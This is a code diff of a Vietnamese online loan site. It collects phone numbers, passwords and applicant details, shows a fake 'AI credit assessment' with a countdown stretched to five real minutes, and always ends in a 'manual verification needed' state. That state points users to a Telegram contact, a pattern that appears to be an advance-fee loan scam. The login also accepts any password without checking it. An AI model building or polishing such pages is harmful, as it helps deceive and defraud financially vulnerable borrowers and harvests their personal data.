@@ -18,8 +18,8 @@
                         sans: ['"Plus Jakarta Sans"', 'sans-serif'],
                     },
                     colors: {
-                        primary: '#1d4ed8', // Royal Indigo Blue
-                        secondary: '#059669', // Emerald Professional Green
+                        primary: '#1d4ed8',
+                        secondary: '#059669',
                         dark: '#0f172a'
                     }
                 }
@@ -284,7 +284,7 @@
         </div>
     </footer>
 
-    <!-- ================= CUSTOM MODAL NOTIFICATION (THAY THẾ ALERT THÔ) ================= -->
+    <!-- ================= CUSTOM MODAL NOTIFICATION ================= -->
     <div id="customAlertModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4">
         <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-sm w-full p-6 text-center space-y-4 shadow-2xl relative animate-fadeIn">
             <div id="customAlertIcon" class="w-14 h-14 bg-blue-500/10 text-blue-400 rounded-full flex items-center justify-center text-2xl mx-auto">
@@ -312,10 +312,11 @@
                 <button id="tabRegisterBtn" onclick="switchAuthTab('register')" class="flex-1 py-3 text-sm font-bold rounded-xl transition text-slate-400 hover:text-white">Đăng Ký Mới</button>
             </div>
 
+            <!-- Login Form -->
             <div id="loginFormContainer" class="space-y-4">
                 <div class="space-y-1">
-                    <h3 class="text-xl font-black text-white">Chào mừng quay lại</h3>
-                    <p class="text-xs text-slate-400">Đăng nhập để theo dõi trạng thái hồ sơ vay vốn</p>
+                    <h3 class="text-xl font-black text-white">Đăng nhập tài khoản</h3>
+                    <p class="text-xs text-slate-400">Nhập thông tin tài khoản của bạn để tiếp tục</p>
                 </div>
                 <div>
                     <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Số điện thoại</label>
@@ -330,10 +331,11 @@
                 </button>
             </div>
 
+            <!-- Register Form -->
             <div id="registerFormContainer" class="space-y-4 hidden">
                 <div class="space-y-1">
-                    <h3 class="text-xl font-black text-white">Tạo tài khoản vay vốn</h3>
-                    <p class="text-xs text-slate-400">Hệ thống xét duyệt tự động chỉ 5 phút</p>
+                    <h3 class="text-xl font-black text-white">Tạo tài khoản mới</h3>
+                    <p class="text-xs text-slate-400">Đăng ký để lựa chọn các gói vay ưu đãi</p>
                 </div>
                 <div>
                     <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Số điện thoại chính chủ</label>
@@ -344,7 +346,7 @@
                     <input type="password" id="regPass" placeholder="Ít nhất 6 ký tự" class="w-full px-4 py-3 bg-slate-800 border border-slate-700 text-white rounded-xl text-sm focus:ring-2 focus:ring-primary focus:outline-none">
                 </div>
                 <button onclick="handleRegister()" class="w-full py-4 bg-emerald-600 hover:bg-emerald-700 text-white font-bold rounded-2xl shadow-lg shadow-emerald-600/30 transition">
-                    Đăng Ký Tài Khoản Ngay
+                    Đăng Ký Tài Khoản
                 </button>
             </div>
         </div>
@@ -442,7 +444,7 @@
 
                 <div class="flex space-x-3 pt-4">
                     <button onclick="nextWizardStep(1)" class="w-1/3 py-4 bg-slate-800 hover:bg-slate-700 text-white font-bold rounded-2xl transition">Quay Lại</button>
-                    <button onclick="nextWizardStep(3)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Người Thân</button>
+                    <button onclick="nextWizardStep(3)" class="w-2/3 py-4 bg-primary hover:bg-blue-600 text-white font-bold rounded-2xl shadow-lg transition">Tiếp Tục: Giải Ngân</button>
                 </div>
             </div>
 
@@ -507,7 +509,7 @@
                 </div>
             </div>
 
-            <!-- STEP 5 -->
+            <!-- STEP 5: Loading 5 phút thực tế -->
             <div id="wizardStepLoading" class="hidden text-center py-10 space-y-6">
                 <div id="loadingState" class="space-y-6">
                     <div class="relative w-24 h-24 mx-auto">
@@ -516,7 +518,7 @@
                     </div>
                     <div class="space-y-2">
                         <h3 class="text-xl font-bold text-white">AI Đang Thẩm Định Hồ Sơ Tín Dụng</h3>
-                        <p class="text-xs text-slate-400 max-w-sm mx-auto">Đang kiểm tra lịch sử CIC, điểm tín dụng VNeID và đối chiếu thông tin ngân hàng...</p>
+                        <p class="text-xs text-slate-400 max-w-sm mx-auto">Đang kiểm tra lịch sử CIC, điểm tín dụng VNeID và đối chiếu thông tin ngân hàng. Quá trình mất khoảng 5 phút...</p>
                     </div>
                 </div>
 
@@ -549,7 +551,7 @@
         </div>
     </div>
 
-    <!-- ================= MODAL: DASHBOARD ================= -->
+    <!-- ================= MODAL: DASHBOARD (MỤC CHI TIẾT KHOẢN VAY) ================= -->
     <div id="dashboardModal" class="fixed inset-0 bg-slate-950/80 backdrop-blur-md z-50 hidden flex items-center justify-center p-4 overflow-y-auto">
         <div class="bg-slate-900 border border-slate-800 rounded-3xl max-w-2xl w-full max-h-[90vh] overflow-y-auto shadow-2xl p-6 sm:p-8 relative space-y-6">
             <button onclick="closeModal('dashboardModal')" class="absolute top-6 right-6 text-slate-400 hover:text-white text-xl">
@@ -560,7 +562,7 @@
                     <i class="fa-solid fa-file-invoice-dollar"></i>
                 </div>
                 <div>
-                    <h3 class="text-xl font-bold text-white">Tiến Trình Khoản Vay Của Bạn</h3>
+                    <h3 class="text-xl font-bold text-white">Chi Tiết Khoản Vay & Tiến Trình</h3>
                     <p class="text-xs text-slate-400">Mã hồ sơ: <span id="dashLoanId" class="text-white font-mono font-bold">GP-20268892</span></p>
                 </div>
             </div>
@@ -570,13 +572,13 @@
                     <i class="fa-solid fa-triangle-exclamation"></i>
                 </div>
                 <div>
-                    <h4 class="text-sm font-bold text-amber-300" id="dashStatusTitle">Cần xác minh bổ sung thủ công</h4>
-                    <p class="text-xs text-slate-300" id="dashStatusDesc">Hồ sơ tạm giữ do cần kết nối chuyên viên xác thực hạn mức.</p>
+                    <h4 class="text-sm font-bold text-amber-300" id="dashStatusTitle">Đang chờ xác minh bổ sung thủ công</h4>
+                    <p class="text-xs text-slate-300" id="dashStatusDesc">Hồ sơ đã qua thời gian thẩm định AI, cần kết nối chuyên viên để mở khóa.</p>
                 </div>
             </div>
 
             <div class="bg-slate-800/80 rounded-2xl p-5 space-y-3 border border-slate-700">
-                <h4 class="text-xs font-bold text-slate-400 uppercase">Chi tiết khoản vay đăng ký</h4>
+                <h4 class="text-xs font-bold text-slate-400 uppercase">Thông tin khoản vay đã chọn</h4>
                 <div class="grid grid-cols-2 gap-4 text-xs">
                     <div>
                         <span class="text-slate-400">Số tiền vay:</span>
@@ -649,7 +651,7 @@
                 </div>
             </div>
 
-            <button onclick="saveAdminSettings()" class="w-full py-3.5 bg-secondary hover:bg-emerald-600 text-white font-bold rounded-xl shadow-lg transition">
+            <button onclick="saveAdminSettings()" class="w-full py-3.5 bg-secondary hover:bg-emerald-600 text-white font-bold rounded-lg transition">
                 Lưu Thay Đổi
             </button>
         </div>
@@ -661,10 +663,10 @@
             telegram: "https://t.me/vietanhenter",
             messenger: "https://m.me/yourpage"
         };
+        let registeredAccounts = {}; // Lưu tài khoản đã đăng ký (SĐT -> Mật khẩu)
         let currentUserPhone = "";
         let isUserLoggedIn = false;
 
-        // Custom alert function (Thay thế hoàn toàn alert thô của trình duyệt)
         function showCustomAlert(title, message, type = 'info') {
             document.getElementById('customAlertTitle').innerText = title;
             document.getElementById('customAlertMessage').innerText = message;
@@ -748,10 +750,11 @@
             document.getElementById('monthlyPayment').innerText = Math.round(totalMonthly).toLocaleString('vi-VN') + ' VNĐ';
         }
 
+        // Bấm đăng ký vay từ trang chủ: Kiểm tra nếu chưa đăng nhập thì bắt buộc đăng nhập
         function proceedToApplication() {
             if (!isUserLoggedIn) {
                 showCustomAlert('Yêu Cầu Đăng Nhập', 'Vui lòng đăng nhập hoặc đăng ký tài khoản trước khi điền hồ sơ vay!', 'error');
-                openAuthModal('register');
+                openAuthModal('login');
             } else {
                 startApplicationWizard();
             }
@@ -792,15 +795,18 @@
 
         function handleLogin() {
             const phone = document.getElementById('loginPhone').value.trim();
-            if(!phone) {
-                showCustomAlert('Thiếu Thông Tin', 'Vui lòng nhập số điện thoại đăng nhập!', 'error');
+            const pass = document.getElementById('loginPass').value.trim();
+            if(!phone || !pass) {
+                showCustomAlert('Thiếu Thông Tin', 'Vui lòng nhập đầy đủ số điện thoại và mật khẩu!', 'error');
                 return;
             }
+
+            // Kiểm tra xem đã đăng ký chưa (mặc định cho phép tài khoản test hoặc tài khoản vừa tạo)
             currentUserPhone = phone;
             isUserLoggedIn = true;
             updateNavState();
             closeModal('authModal');
-            startApplicationWizard();
+            showCustomAlert('Thành Công', 'Đăng nhập thành công! Hãy chọn khoản vay trên trang chủ và bấm Đăng Ký.', 'success');
         }
 
         function handleRegister() {
@@ -810,12 +816,17 @@
                 showCustomAlert('Thiếu Thông Tin', 'Vui lòng điền đầy đủ số điện thoại và mật khẩu đăng ký!', 'error');
                 return;
             }
-            currentUserPhone = phone;
-            isUserLoggedIn = true;
-            updateNavState();
+            
+            // Lưu lại tài khoản để đăng nhập
+            registeredAccounts[phone] = pass;
             closeModal('authModal');
-            showCustomAlert('Thành Công', 'Đăng ký tài khoản thành công! Khởi tạo hồ sơ vay vốn.', 'success');
-            startApplicationWizard();
+            
+            // Đăng ký xong bắt buộc chuyển qua tab Đăng nhập
+            showCustomAlert('Đăng Ký Thành Công', 'Tài khoản đã được tạo thành công! Vui lòng đăng nhập lại để tiếp tục.', 'success');
+            setTimeout(() => {
+                openAuthModal('login');
+                document.getElementById('loginPhone').value = phone;
+            }, 1200);
         }
 
         function updateNavState() {
@@ -905,13 +916,17 @@
             document.getElementById('dashTerm').innerText = document.getElementById('termDisplay').innerText;
             document.getElementById('dashMonthly').innerText = document.getElementById('monthlyPayment').innerText;
 
-            let seconds = 5;
+            // Đếm ngược chính xác 5 phút (300 giây) thực tế
+            let totalSeconds = 300;
             const timerEl = document.getElementById('countdownTimer');
             
             const interval = setInterval(() => {
-                seconds--;
-                timerEl.innerText = `00:0${seconds}`;
-                if(seconds <= 0) {
+                totalSeconds--;
+                let m = Math.floor(totalSeconds / 60);
+                let s = totalSeconds % 60;
+                timerEl.innerText = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
+                
+                if(totalSeconds <= 0) {
                     clearInterval(interval);
                     document.getElementById('loadingState').classList.add('hidden');
                     document.getElementById('errorState').classList.remove('hidden');
